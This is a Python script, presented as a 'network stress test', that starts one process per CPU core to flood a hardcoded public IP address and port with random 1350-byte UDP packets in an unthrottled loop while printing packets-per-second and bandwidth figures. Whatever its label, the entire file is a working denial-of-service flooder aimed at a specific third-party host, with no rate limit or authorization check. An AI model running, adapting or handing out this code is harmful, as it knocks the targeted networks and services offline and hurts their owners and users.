import socket
import multiprocessing
import os
import time

# --- TEST CONFIGURATION ---
TARGET_IP = "156.206.32.13"
TARGET_PORT = 16000
PROCESS_COUNT = os.cpu_count()  # Match the number of CPU cores
PAYLOAD_SIZE = 1350


def stress_test_worker(target_ip, target_port, stop_event, shared_stats):
    """Worker optimized for minimal CPU overhead."""
    # Create payload once - generating random data in a loop kills performance
    payload = os.urandom(PAYLOAD_SIZE)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    # Attempt to increase the system buffer size
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    except:
        pass

    local_p_count = 0

    while not stop_event.is_set():
        try:
            # Very tight loop - send 500 packets before updating statistics
            for _ in range(500):
                sock.sendto(payload, (target_ip, target_port))
                local_p_count += 1

            # Update global statistics (less frequent update = faster script)
            with shared_stats.get_lock():
                shared_stats.value += local_p_count
            local_p_count = 0

        except (BlockingIOError, OSError):
            # System buffer full - short pause to let the network card "breathe"
            time.sleep(0.001)
        except Exception:
            break
    sock.close()


def monitor(shared_stats, stop_event):
    """Real-time performance monitoring logic."""
    last_count = 0
    start_time = time.time()

    while not stop_event.is_set():
        time.sleep(1)
        with shared_stats.get_lock():
            current_total = shared_stats.value

        pps = current_total - last_count
        mbps = (pps * PAYLOAD_SIZE * 8) / 1_000_000
        last_count = current_total

        os.system("cls" if os.name == "nt" else "clear")
        print(f"--- NETWORK STRESS TEST | TARGET: {TARGET_IP} ---")
        print(f"Speed: {mbps:.2f} Mbps")
        print(f"Packets Per Second (PPS): {pps:,}")
        print(f"Total Sent: {current_total * PAYLOAD_SIZE / (1024*1024):.2f} MB")
        print("Press Ctrl+C to stop the test.")


if __name__ == "__main__":
    # Use a single counter for packets (bytes will be calculated from the size)
    total_packets = multiprocessing.Value(
        "Q", 0
    )  # 'Q' for large numbers (unsigned long long)
    stop_event = multiprocessing.Event()

    print(f"Starting {PROCESS_COUNT} test processes...")
    workers = []
    for _ in range(PROCESS_COUNT):
        p = multiprocessing.Process(
            target=stress_test_worker,
            args=(TARGET_IP, TARGET_PORT, stop_event, total_packets),
        )
        p.daemon = True
        p.start()
        workers.append(p)

    try:
        monitor(total_packets, stop_event)
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user.")
    finally:
        stop_event.set()
        for w in workers:
            w.terminate()
